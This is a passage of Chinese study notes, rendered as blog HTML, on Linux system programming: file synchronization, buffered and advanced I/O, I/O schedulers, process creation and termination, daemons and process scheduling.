href="#2-4-1-fsync-and-fdatasync" class="headerlink" title="2.4.1 fsync() and fdatasync()"></a>2.4.1 fsync() and fdatasync()</h3><p>fsync():</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">fsync</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span></span>;<br></code></pre></td></tr></table></figure><p>fdatasync():</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br></code></pre></td></tr></table></figure><p>这两个函数不能保证已经更新的包含该文件的目录项会同步到磁盘上. 为了保证1对目录项的更新也都同步到磁盘上，必须对文件目录也调用<code>fsync()</code>进行同步。</p><p>返回值和错误码，同时设置<code>errno</code>的值。</p><p>在POSIX标准中，fysnc()是必要的，而fdarasync()是可选的。</p><h3 id="2-4-2-sync"><a href="#2-4-2-sync" class="headerlink" title="2.4.2 sync()"></a>2.4.2 sync()</h3><p><code>sync()</code>系统调用用来对磁盘上的所有缓冲区进行同步。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">sync</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>;<br></code></pre></td></tr></table></figure><p>关于同步时注意数据和元数据是否都写入。</p><h3 id="2-4-3-O-SYNC标志位"><a href="#2-4-3-O-SYNC标志位" class="headerlink" title="2.4.3 O_SYNC标志位"></a>2.4.3 O_SYNC标志位</h3><p>系统调用open()可以使用O_SYNC标志位，表示该文件的所有I&#x2F;O操作都需要同步。</p><h2 id="2-6-关闭文件"><a href="#2-6-关闭文件" class="headerlink" title="2.6 关闭文件"></a>2.6 关闭文件</h2><p>系统调用<code>close()</code>会取消当前进程的文件描述符fd与其关联的文件之间的映射。</p><p>关闭文件操作并非意味着该文件的数据已经被写到磁盘。</p><p>当关闭指向某个文件的最后一个文件描述符时，内核中表示该文件的数据结构就释放了。</p><h2 id="2-7-用lseek-查找"><a href="#2-7-用lseek-查找" class="headerlink" title="2.7 用lseek()查找"></a>2.7 用lseek()查找</h2><p>设置文件位置, 应该就是文件操作的位置.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">off_t</span> <span class="hljs-title">lseek</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">off_t</span> pos, <span class="hljs-type">int</span> origin)</span></span>;<br></code></pre></td></tr></table></figure><h3 id="2-7-1-在文件末尾后查找"><a href="#2-7-1-在文件末尾后查找" class="headerlink" title="2.7.1 在文件末尾后查找"></a>2.7.1 在文件末尾后查找</h3><p>在UNIX文件系统上，空洞不占用任何物理磁盘空间。</p><h2 id="2-8-定位读写"><a href="#2-8-定位读写" class="headerlink" title="2.8 定位读写"></a>2.8 定位读写</h2><p>在读写操作时，都把文件位置作为参数，在完成时，不会更新文件位置指针。</p><h2 id="2-9-文件截短"><a href="#2-9-文件截短" class="headerlink" title="2.9 文件截短"></a>2.9 文件截短</h2><p>将给定文件截短为参数len指定的长度。</p><p>大多数的行为:</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang">成功时返回<span class="hljs-number">0</span>,出错时返回-<span class="hljs-number">1</span>并设置相应的errno值.<br></code></pre></td></tr></table></figure><h2 id="2-10-Multiplexed-I-x2F-O"><a href="#2-10-Multiplexed-I-x2F-O" class="headerlink" title="2.10 Multiplexed I&#x2F;O"></a>2.10 Multiplexed I&#x2F;O</h2><p>允许应用同时在多个文件描述符上阻塞，可能意思就是，当在一个文件描述符上阻塞时，可以切换到处理另外一个文件描述符。</p><p>设计原则:</p><pre><code class="hljs">1. 当任何一个文件描述符I/O就绪时进行通知2. 在有可用文件描述符之前一直就处于睡眠状态3. 当有文件描述符可用时唤醒4. 处理所有I/O就绪的文件描述符，没有阻塞5. 返回第一步，重新开始</code></pre><p>Linux有三种方案:select, poll and epoll.</p><h3 id="2-10-1-select"><a href="#2-10-1-select" class="headerlink" title="2.10.1 select()"></a>2.10.1 select()</h3><p>监测readfds集合中的文件描述符是否有可以不阻塞就读取。</p><p>在调用返回时，如果文件描述符比如7还在集合中，它在I&#x2F;O读取时不会阻塞.</p><h2 id="2-11-Kernel-Internals"><a href="#2-11-Kernel-Internals" class="headerlink" title="2.11 Kernel Internals"></a>2.11 Kernel Internals</h2><p>内核中的三个主要子系统: 虚拟文件系统(VFS), 页缓存(page cache), 页回写(page writeback).</p><h3 id="2-11-1-虚拟文件系统"><a href="#2-11-1-虚拟文件系统" class="headerlink" title="2.11.1 虚拟文件系统"></a>2.11.1 虚拟文件系统</h3><p>虚拟文件系统调用文件系统函数并操作文件系统的数据。</p><p>其系统调用可以在任意媒介的任意文件系统上读，工具可以从任何一个文件系统拷贝到另一个上.</p><h3 id="2-11-2-页缓存"><a href="#2-11-2-页缓存" class="headerlink" title="2.11.2 页缓存"></a>2.11.2 页缓存</h3><p>为什么是”页”缓存，”页”是内存寻址的最小单位。</p><p>将最近在磁盘文件系统上访问过的数据放在内存中.</p><p>利用了”时间局限性原理”即刚被访问的资源在不久后再次访问的概率很高。</p><p>“空间局部性”即数据往往是连续访问的。就是在每次读取时多读几个比特.</p><h3 id="2-11-3-页回写"><a href="#2-11-3-页回写" class="headerlink" title="2.11.3 页回写"></a>2.11.3 页回写</h3><p>将磁盘文件和内存数据同步的过程为”回写(writeback)”.</p><p>触发条件:</p><pre><code class="hljs">1. 当空闲内存小于预定的阈值，&quot;脏&quot;缓冲区就会写道磁盘上，这样被清理的缓冲区会被移除，释放内存空间。2. 当&quot;脏&quot;缓冲区的时长超过预定的阈值时，该缓冲区就会写到磁盘。通过这种方式，可以避免数据一直是&quot;脏&quot;数据。</code></pre><p>延迟写在电源出故障时可能会丢失数据。</p><h1 id="第三章-缓冲I-x2F-O"><a href="#第三章-缓冲I-x2F-O" class="headerlink" title="第三章 缓冲I&#x2F;O"></a>第三章 缓冲I&#x2F;O</h1><p>块是I&#x2F;O中的基本概念。</p><p>也许你只想读取一个字节，实际上要读取整个块.</p><h2 id="3-1-用户缓冲I-x2F-O"><a href="#3-1-用户缓冲I-x2F-O" class="headerlink" title="3.1 用户缓冲I&#x2F;O"></a>3.1 用户缓冲I&#x2F;O</h2><p><mark>只有当数据量大小达到文件系统块大小的整数倍时，才会执行真正的I&#x2F;O操作。</mark></p><p>为了利用性能提升的优势，需要预先了解物理快大小，块大小不是磁盘块的整数倍会导致不对齐操作。</p><h2 id="3-2-标准I-x2F-O"><a href="#3-2-标准I-x2F-O" class="headerlink" title="3.2 标准I&#x2F;O"></a>3.2 标准I&#x2F;O</h2><p>实现了跨平台的用户缓冲解决方案。</p><h3 id="文件指针"><a href="#文件指针" class="headerlink" title="文件指针"></a>文件指针</h3><p>标准I&#x2F;O程序集通过操作文件指针(file pointer)，文件指针和文件描述符是一一映射。</p><p>文件指针是由指向类型定义FILE的指针表示，其定义在&lt;stdio.h&gt;中。</p><h4 id="FILE为什么全部大写"><a href="#FILE为什么全部大写" class="headerlink" title="FILE为什么全部大写"></a>FILE为什么全部大写</h4><p>历史遗留原因，以前通过宏实现。</p><p>在标准I&#x2F;O中，打开的文件称为”流(stream)”. </p><p>输入流，应该看作输入到流。</p><h2 id="3-3-打开文件"><a href="#3-3-打开文件" class="headerlink" title="3.3 打开文件"></a>3.3 打开文件</h2><p>通过<code>fopen()</code>.</p><p><code>fopen()</code>执行成功时，返回一个合法的FILE指针，失败时，返回NULL,并相应设置errno值.</p><h2 id="3-4-通过文件描述符打开流"><a href="#3-4-通过文件描述符打开流" class="headerlink" title="3.4 通过文件描述符打开流"></a>3.4 通过文件描述符打开流</h2><p>通过<code>fdopen()</code>把一个已经打开的文件描述符(fd)转换成流。</p><h2 id="3-5-关闭流"><a href="#3-5-关闭流" class="headerlink" title="3.5 关闭流"></a>3.5 关闭流</h2><p>使用<code>fclose()</code>函数。</p><p>成功时返回0, 失败时返回EOF并且相应的设置errno.</p><p>讨论了三个读写方式: 单个字符，字符串，二进制.</p><h2 id="3-6-向流中写数据"><a href="#3-6-向流中写数据" class="headerlink" title="3.6 向流中写数据"></a>3.6 向流中写数据</h2><h3 id="3-6-1-对齐的讨论"><a href="#3-6-1-对齐的讨论" class="headerlink" title="3.6.1 对齐的讨论"></a>3.6.1 对齐的讨论</h3><p>所有的机器设计都有数据对齐的要求。</p><p>处理器都以特定的粒度来访问内存, 例如2, 4, 8 或 16字节。</p><p>编译器自动对其数据.</p><p>因为变量长度、对齐等等的不同，一个程序写入的二进制数据对于另外一个程序可能是不可读的。</p><h2 id="3-7-定位流"><a href="#3-7-定位流" class="headerlink" title="3.7 定位流"></a>3.7 定位流</h2><p><code>fseek()</code>函数，操纵流指向文件中由offset和whence指定的位置。</p><p><code>rewind()</code>函数，将位置重置到流初始位置.</p><p>理解C函数库维持的缓冲区和内核拥有的缓冲区的区别。前者保留在用户空间中。</p><h2 id="3-10-控制缓冲"><a href="#3-10-控制缓冲" class="headerlink" title="3.10 控制缓冲"></a>3.10 控制缓冲</h2><p>一些选项:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">不缓冲，数据直接提交到内核<br><br>行缓冲，每当遇到换行符，缓冲区被提交到内核<br><br>块缓冲，适用于文件，默认的所有的和文件相关的流都是块缓冲<br></code></pre></td></tr></table></figure><p>流是不是一个缓冲区。</p><h2 id="3-11-线程安全"><a href="#3-11-线程安全" class="headerlink" title="3.11 线程安全"></a>3.11 线程安全</h2><p>线程的定义是共享统一地址空间的多个进程。</p><p>一个线程要想执行任何I&#x2F;O请求，必须首先获得锁并且成为所有者线程。</p><h1 id="第四章-高级文件I-x2F-O"><a href="#第四章-高级文件I-x2F-O" class="headerlink" title="第四章 高级文件I&#x2F;O"></a>第四章 高级文件I&#x2F;O</h1><p>Linux提供的高级I&#x2F;O系统调用:</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">散布<span class="hljs-operator">/</span>聚集<span class="hljs-built_in">I</span><span class="hljs-operator">/</span><span class="hljs-built_in">O</span><span class="hljs-punctuation">(</span><span class="hljs-variable">Scatter</span><span class="hljs-operator">/</span><span class="hljs-variable">gather</span> <span class="hljs-built_in">I</span><span class="hljs-operator">/</span><span class="hljs-built_in">O</span><span class="hljs-punctuation">)</span><br><br><span class="hljs-variable">epoll</span><br><br>内存映射<span class="hljs-built_in">I</span><span class="hljs-operator">/</span><span class="hljs-built_in">O</span><br><br>文件<span class="hljs-built_in">I</span><span class="hljs-operator">/</span><span class="hljs-built_in">O</span>提示<br><br>异步<span class="hljs-built_in">I</span><span class="hljs-operator">/</span><span class="hljs-built_in">O</span><br></code></pre></td></tr></table></figure><h2 id="4-1-散步-x2F-聚集I-x2F-O"><a href="#4-1-散步-x2F-聚集I-x2F-O" class="headerlink" title="4.1 散步&#x2F;聚集I&#x2F;O"></a>4.1 散步&#x2F;聚集I&#x2F;O</h2><p>命名原由，数据被散布到一个缓冲区向量，或者从一个缓冲区向量聚集.</p><p>其在单次系统调用中操作多个缓冲区的I&#x2F;O.</p><p>每个iovec结构体描述一个独立的缓冲区，我们称其为段(segment).</p><p>一组segment的集合称为向量(vector). 每个段描述了所要读写的缓冲区的地址和长度。</p><h2 id="4-2-Event-Poll接口"><a href="#4-2-Event-Poll接口" class="headerlink" title="4.2 Event Poll接口"></a>4.2 Event Poll接口</h2><p>Event Poll(epoll)机制。p96</p><h3 id="4-2-4-边沿触发事件和水平触发事件"><a href="#4-2-4-边沿触发事件和水平触发事件" class="headerlink" title="4.2.4 边沿触发事件和水平触发事件"></a>4.2.4 边沿触发事件和水平触发事件</h3><p>水平出发，在一个状态发生时触发。</p><p>边沿触发，状态改变时产生。</p><h2 id="4-3-存储映射"><a href="#4-3-存储映射" class="headerlink" title="4.3 存储映射"></a>4.3 存储映射</h2><p>除标准I&#x2F;O之外的另一种I&#x2F;O方式，应用程序将文件映射到内存中。</p><h3 id="4-3-1-1-页大小"><a href="#4-3-1-1-页大小" class="headerlink" title="4.3.1.1 页大小"></a>4.3.1.1 页大小</h3><p>页是内存映射的基本块，同时也是进程地址空间的基本块。</p><p>mmap()在处理大文件，或者在文件的大小恰好被page大小整除时优势明显。</p><h2 id="4-5-Synchronized-Synchronous-and-Asynchronous-Operations"><a href="#4-5-Synchronized-Synchronous-and-Asynchronous-Operations" class="headerlink" title="4.5 Synchronized, Synchronous, and Asynchronous Operations"></a>4.5 Synchronized, Synchronous, and Asynchronous Operations</h2><p>Synchronous写操作在数据全部写到内核缓冲区之前是不会返回的。</p><p>Asynchronous写操作在用户空间还有数据时可能就返回了。</p><h2 id="4-6-I-x2F-O调度器和I-x2F-O性能"><a href="#4-6-I-x2F-O调度器和I-x2F-O性能" class="headerlink" title="4.6 I&#x2F;O调度器和I&#x2F;O性能"></a>4.6 I&#x2F;O调度器和I&#x2F;O性能</h2><p>硬盘和系统中其他部分的性能差距比较大。</p><p>I&#x2F;O调度器尽力将硬盘访问的性能损失控制在最小。</p><p>硬盘基于柱面(cylinders), 磁头(heads), 和扇区(section)的几何寻址方式，称CHS寻址。</p><p>现代系统通过块号与CHS地址的映射寻址。</p><h3 id="4-6-2-调度器功能"><a href="#4-6-2-调度器功能" class="headerlink" title="4.6.2 调度器功能"></a>4.6.2 调度器功能</h3><p>实现两个基本操作: </p><pre><code class="hljs">1. 合并(merging), 将两个或多个相邻的I/O请求的过程合并为一个。2. 排序(sorting), 选取两个操作中相对更重要的一个，并按块号递增的顺序重新安排等待的I/O请求。</code></pre><h3 id="4-6-3-改进读请求"><a href="#4-6-3-改进读请求" class="headerlink" title="4.6.3 改进读请求"></a>4.6.3 改进读请求</h3><h4 id="4-6-3-1-Deadline算法"><a href="#4-6-3-1-Deadline算法" class="headerlink" title="4.6.3.1 Deadline算法"></a>4.6.3.1 Deadline算法</h4><p>在I&#x2F;O请求上加入了最后期限，调度器是一个程序。</p><h4 id="4-6-3-2-Anticipatory算法"><a href="#4-6-3-2-Anticipatory算法" class="headerlink" title="4.6.3.2 Anticipatory算法"></a>4.6.3.2 Anticipatory算法</h4><p>和 Deadline 一样开始，但具有预测机制。</p><h4 id="4-6-3-3-CFQ-I-x2F-O调度器"><a href="#4-6-3-3-CFQ-I-x2F-O调度器" class="headerlink" title="4.6.3.3 CFQ I&#x2F;O调度器"></a>4.6.3.3 CFQ I&#x2F;O调度器</h4><h4 id="4-6-3-4-Noop-I-x2F-O调度器"><a href="#4-6-3-4-Noop-I-x2F-O调度器" class="headerlink" title="4.6.3.4 Noop I&#x2F;O调度器"></a>4.6.3.4 Noop I&#x2F;O调度器</h4><h3 id="4-6-4-选择和配置你的I-x2F-O调度器"><a href="#4-6-4-选择和配置你的I-x2F-O调度器" class="headerlink" title="4.6.4 选择和配置你的I&#x2F;O调度器"></a>4.6.4 选择和配置你的I&#x2F;O调度器</h3><p>目录<code>/sys/block/device/queue/iosched</code></p><h3 id="4-6-5-优化I-x2F-O性能"><a href="#4-6-5-优化I-x2F-O性能" class="headerlink" title="4.6.5 优化I&#x2F;O性能"></a>4.6.5 优化I&#x2F;O性能</h3><h4 id="4-6-5-1-用户空间I-x2F-O调度"><a href="#4-6-5-1-用户空间I-x2F-O调度" class="headerlink" title="4.6.5.1 用户空间I&#x2F;O调度"></a>4.6.5.1 用户空间I&#x2F;O调度</h4><p>以有利于寻址操作的顺序提交, 可按照以下方式:</p><pre><code class="hljs">1. 完整路径2. inode编号3. 文件的物理块</code></pre><p>文件i的inode序号 &lt; 文件j的inode号</p><p>通常意味着：</p><p>文件i的物理块 &lt; 文件j的物理块</p><h1 id="第五章-进程管理"><a href="#第五章-进程管理" class="headerlink" title="第五章 进程管理"></a>第五章 进程管理</h1><p>进程是UNIX系统中仅次于文件的基本抽象概念.</p><p>进程不仅仅包含汇编代码，它由数据、资源、状态和一个虚拟的计算机组成。</p><h2 id="5-1-进程ID"><a href="#5-1-进程ID" class="headerlink" title="5.1 进程ID"></a>5.1 进程ID</h2><p>简称pid.</p><p>本质上将，大多数代码会假设内核不会重用已经用过的pid值。</p><p>空闲进程(idle process)，当没有其他进程运行时，内核所运行的进程，其pid是0.</p><p>内核必须寻找一个适合的init程序。<br>查找位置和顺序:</p><pre><code class="hljs">1. /sbin/init2. /etc/init3. /bin/init4. /bin/sh, 当内核没有找到init时，内核会尝试运行它.</code></pre><p>所以内核似乎也就是个程序。</p><h3 id="5-1-1-分配进程ID"><a href="#5-1-1-分配进程ID" class="headerlink" title="5.1.1 分配进程ID"></a>5.1.1 分配进程ID</h3><p>缺省最大为32768.</p><p>设置<code>/proc/sys/kernel/pid_max</code>来修改。</p><p>内核不会重用以前已经分配过的值。</p><h3 id="5-1-2-进程体系"><a href="#5-1-2-进程体系" class="headerlink" title="5.1.2 进程体系"></a>5.1.2 进程体系</h3><p>父进程号(ppid).</p><p>每个进程都被一个用户和一个组拥有。</p><p>每个子进程都继承了父进程的用户和组。</p><p>所有与管道相关的命令都属于同一个进程组。</p><h3 id="5-1-3-pid-t"><a href="#5-1-3-pid-t" class="headerlink" title="5.1.3 pid_t"></a>5.1.3 pid_t</h3><p>在Linux通常是C语言中的int类型。</p><p>系统调用似乎就是系统编程中的函数.</p><h2 id="5-2-运行新进程"><a href="#5-2-运行新进程" class="headerlink" title="5.2 运行新进程"></a>5.2 运行新进程</h2><p><code>fork()</code>基本上就是复制父进程。</p><h3 id="5-2-1-exec系列系统调用"><a href="#5-2-1-exec系列系统调用" class="headerlink" title="5.2.1 exec系列系统调用"></a>5.2.1 exec系列系统调用</h3><p>没有单一的exec系统调用，而是一组exec函数构成。</p><p>可变长参数以<code>NULL</code>结尾。</p><h3 id="5-2-2-fork-系统调用"><a href="#5-2-2-fork-系统调用" class="headerlink" title="5.2.2 fork()系统调用"></a>5.2.2 fork()系统调用</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/type.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">pid_t</span> <span class="hljs-title">fork</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>;<br></code></pre></td></tr></table></figure><p>创建了一个子进程后，父进程会没有任何改变的继续运行下去，<code>execv()</code>会使子进程去运行<code>/bin/windlass</code></p><h4 id="5-2-2-1-写时复制"><a href="#5-2-2-1-写时复制" class="headerlink" title="5.2.2.1 写时复制"></a>5.2.2.1 写时复制</h4><p>早期UNIX系统为逐页复制。</p><p>现代UNIX系统如Linux，采用写时复制。</p><p>如果一个进程要修改自己的那份资源，那就复制一份，修改别的资源时只需要指向那个资源的指针。意思就是并不是完全复制父进程，部分资源就是指向父进程的资源，只有当要使用那份资源时才会复制。</p><p>好处: 如果进程从来就不需要修改资源，则不需要进行复制。</p><p>在<code>fork()</code>调用结束后，父进程和子进程都相信它们有一个自己的地址空间，但实际上它们共享父进程的原始页。</p><p><mark>理解:</mark><br>所以共享地址空间的意思就是是同一段代码。</p><h4 id="5-2-2-2-vfork"><a href="#5-2-2-2-vfork" class="headerlink" title="5.2.2.2 vfork()"></a>5.2.2.2 vfork()</h4><h2 id="5-3-终止进程"><a href="#5-3-终止进程" class="headerlink" title="5.3 终止进程"></a>5.3 终止进程</h2><p>POSIX和C89都定义了终止当前进程的标准函数:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><br>void <span class="hljs-keyword">exit</span>(int status);<br></code></pre></td></tr></table></figure><p>vfork()的使用者终止进程时必须使用<code>_exit()</code>, 而不是<code>exit()</code>.</p><h3 id="5-3-1-其他终止进程的方式"><a href="#5-3-1-其他终止进程的方式" class="headerlink" title="5.3.1 其他终止进程的方式"></a>5.3.1 其他终止进程的方式</h3><p>在<code>main()</code>函数返回时明确给出一个状态值，或者调用<code>exit()</code>是个良好的变成习惯。</p><h3 id="5-3-2-atexit"><a href="#5-3-2-atexit" class="headerlink" title="5.3.2 atexit()"></a>5.3.2 atexit()</h3><p>用来注册一些在进程结束时要调用的函数。</p><p>函数调用的顺序和注册顺序相反。也就是这些函数存储在栈中。</p><h3 id="5-3-4-SIGCHLD"><a href="#5-3-4-SIGCHLD" class="headerlink" title="5.3.4 SIGCHLD"></a>5.3.4 SIGCHLD</h3><p>当一个子进程终止时，内核会向其父进程发送SIGCHILD信号。</p><h2 id="5-4-等待终止的子进程"><a href="#5-4-等待终止的子进程" class="headerlink" title="5.4 等待终止的子进程"></a>5.4 等待终止的子进程</h2><p>处于这种状态的进程叫做僵死(zombie)进程，保留最小的概要信息。</p><p>只要父进程获取了子进程的信息，子进程就会消失，否则一直保持僵死状态。</p><p><code>wait()</code>返回已i终止子进程的pid.</p><h3 id="5-4-1-等待特定的进程"><a href="#5-4-1-等待特定的进程" class="headerlink" title="5.4.1 等待特定的进程"></a>5.4.1 等待特定的进程</h3><p><code>waitpid()</code>系统调用。</p><h3 id="5-4-1-等待特定进程"><a href="#5-4-1-等待特定进程" class="headerlink" title="5.4.1 等待特定进程"></a>5.4.1 等待特定进程</h3><h3 id="5-4-5-僵死进程"><a href="#5-4-5-僵死进程" class="headerlink" title="5.4.5 僵死进程"></a>5.4.5 僵死进程</h3><p>只要有进程结束了，内核就会遍历它的所有子进程，并且把他们的父进程重新设置为<code>init</code>进程。这保证了系统中没有不存在父进程的进程。</p><h2 id="用户和组"><a href="#用户和组" class="headerlink" title="用户和组"></a>用户和组</h2><p>用户ID和组ID分别用C语言deuid_t和gid_t这两个类型表示。</p><p>数字表示和字符表示是映射关系.</p><p>在Linux中，一个进程的用户ID和组ID代表这个进程可以执行哪些操作。</p><p>最好采用”最小权限”原则。</p><h3 id="5-5-1-实际用户-组-ID、有效用户-组-ID和保护设置用户-组-ID"><a href="#5-5-1-实际用户-组-ID、有效用户-组-ID和保护设置用户-组-ID" class="headerlink" title="5.5.1 实际用户(组)ID、有效用户(组)ID和保护设置用户(组)ID"></a>5.5.1 实际用户(组)ID、有效用户(组)ID和保护设置用户(组)ID</h3><p>与进程相关的用户ID有四个:</p><pre><code class="hljs">1. 实际用户ID, 运行这个进程的那个用户的uid2. 有效用户ID, 当前进程所使用的用户ID, 权限验证一般使用的值。3. 保存设置用户ID, 是进程原先的有效用户ID4. 文件系统用户ID</code></pre><h2 id="5-6-会话和进程组"><a href="#5-6-会话和进程组" class="headerlink" title="5.6 会话和进程组"></a>5.6 会话和进程组</h2><p>每个进程都属于某个进程组。</p><p>进程组的主要特征: 信号可以发送给进程中所有进程，这个信号可以使同一个进程组中的所有进程终止、停止或者继续运行。</p><p>每个进程组都由进程组ID(pgid)唯一标识。</p><p>进程组ID就是组长进程的ID. 只要进程组中还有一个进程存在，则该进程组就存在。</p><p>一个会话就是一个或多个进程组，会话的功能和shell差不多。</p><p>进程组提供了向其中所有进程发送信号的机制，会话则将登录与控制终端联系起来。</p><p>进程组中直接与用户打交道并且控制终端为前台进程组，其他都是后台进程组。</p><p>守护进程会创建自己的会话。</p><h2 id="5-7-守护进程"><a href="#5-7-守护进程" class="headerlink" title="5.7 守护进程"></a>5.7 守护进程</h2><p>守护进程运行在后台，不与任何控制终端相关联。</p><p>习惯上守护进程的名字通常以d结尾。</p><p>这个名字来源于麦克斯韦妖(Maxwell’s demon). 希腊神话中的demon是神的助手，做一些奥林匹斯山的居民自己不愿意做的事.</p><p>守护进程的两个基本要求:</p><pre><code class="hljs">1. 必须是init进程的子进程2. 不与任何控制终端相关联</code></pre><h1 id="第六章-高级进程管理"><a href="#第六章-高级进程管理" class="headerlink" title="第六章 高级进程管理"></a>第六章 高级进程管理</h1><h2 id="6-1-进程调度"><a href="#6-1-进程调度" class="headerlink" title="6.1 进程调度"></a>6.1 进程调度</h2><p>进程调度器是把有限的处理器资源分配给进程的内核子系统，是内核中决定哪个进程可以运行的组件。</p><p>多任务操作系统可以分为两大类:</p><pre><code class="hljs">1. 协同式2. 抢占式</code></pre><p>Linux实现了后一种形式的多任务，调度器可以要求一个进程停止运行，处理器转而运行另一个程序。</p><p>在协同多任务系统中，一个进程持续运行直到它自发停止。</p><h3 id="6-1-1-大O记法"><a href="#6-1-1-大O记法" class="headerlink" title="6.1.1 大O记法"></a>6.1.1 大O记法</h3><p>形式地定义:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">if f(<span class="hljs-keyword">x</span>) is O(g(<span class="hljs-keyword">x</span>))<br><br>then<br><br>存在<span class="hljs-keyword">c</span><span class="hljs-punctuation">,</span><span class="hljs-keyword">x</span><span class="hljs-number">1</span> such that f(<span class="hljs-keyword">x</span>) &lt;<span class="hljs-operator">=</span> <span class="hljs-keyword">c</span> * g(<span class="hljs-keyword">x</span>)<span class="hljs-punctuation">,</span> 对于任意<span class="hljs-keyword">x</span>&gt;<span class="hljs-keyword">x</span><span class="hljs-number">1</span>都成立<br></code></pre></td></tr></table></figure><h3 id="6-1-2-时间片"><a href="#6-1-2-时间片" class="headerlink" title="6.1.2 时间片"></a>6.1.2 时间片</h3><p>进程不一定要在一次运行中耗光所有时间片。</p><h3 id="6-1-3-I-x2F-O约束进程-VS-处理器约束进程"><a href="#6-1-3-I-x2F-O约束进程-VS-处理器约束进程" class="headerlink" title="6.1.3 I&#x2F;O约束进程 VS 处理器约束进程"></a>6.1.3 I&#x2F;O约束进程 VS 处理器约束进程</h3><p>持续地消耗所有可用时间片的进程称为”处理器约束进程”.</p><p>多数时间处于等待资源的阻塞状态的进程称为”I&#x2F;O约束进程”.</p><h3 id="6-1-4-抢占调度"><a href="#6-1-4-抢占调度" class="headerlink" title="6.1.4 抢占调度"></a>6.1.4 抢占调度</h3><p>UNIX调度中一条重要原则: 所有的进程必须运行。</p><h3 id="6-1-5-线程"><a href="#6-1-5-线程" class="headerlink" title="6.1.5 线程"></a>6.1.5 线程</h3><p>本质上，内核没有线程概念，对于Linux内核来说，所有的线程都是独立的进程。</p><p>共享同一地址空间，即同样的动态内存，映射文件，目标代码等。</p><h2 id="6-2-让出处理器"><a href="#6-2-让出处理器" class="headerlink" title="6.2 让出处理器"></a>6.2 让出处理器</h2><h2 id="6-3-进程优先级"><a href="#6-3-进程优先级" class="headerlink" title="6.3 进程优先级"></a>6.3 进程优先级</h2><p>历史上, Unix把这个优先级称为”nice value”.</p><p>Linux调度器基于这样的原则来调度: 高优先级的程序总是先运行。 同时，nice值也指明了进程的时间片长度。</p><p>合法的优先级在-20到19之间，默认为零。nice值越低, 优先级越高，时间片越长.</p><h3 id="6-3-3-I-x2F-O优先级"><a href="#6-3-3-I-x2F-O优先级" class="headerlink" title="6.3.3 I&#x2F;O优先级"></a>6.3.3 I&#x2F;O优先级</h3><h3 id="6-4-处理器亲和度"><a href="#6-4-处理器亲和度" class="headerlink" title="6.4 处理器亲和度"></a>6.4 处理器亲和度</h3><p>进程调度器必须解决两个问题:</p><pre><code class="hljs">1. 必须充分利用系统的处理器2. 尽量避免处理器空闲</code></pre><p>如果进程曾在某一CPU上运行，进程调度器还应该尽量把它放在同一CPU上。</p><p>处理器亲和度表明一个进程停留在统一处理器上的可能性。</p><p>“软亲和度(soft affinity)”表明调度器持续调度进程到同一处理器上的自然倾向。</p><p>“硬亲和度(hard affinity)”描述了强制内核保证进程到处理器的绑定。</p><h2 id="6-5-实时系统"><a href="#6-5-实时系统" class="headerlink" title="6.5 实时系统"></a>6.5 实时系统</h2><p>如果一个系统受到操作期限(请求与响应之间的最小量和命令次数)的支配，就称该系统是”实时”的。</p><h3 id="6-5-1-软硬实时系统"><a href="#6-5-1-软硬实时系统" class="headerlink" title="6.5.1 软硬实时系统"></a>6.5.1 软硬实时系统</h3><p>硬实时系统对于操作期限要求非常严格，超过期限就会产生失败。</p><p>软实时系统不认为超过期限是一个严重的失败。</p><h3 id="6-5-2-延时，抖动和截止期限"><a href="#6-5-2-延时，抖动和截止期限" class="headerlink" title="6.5.2 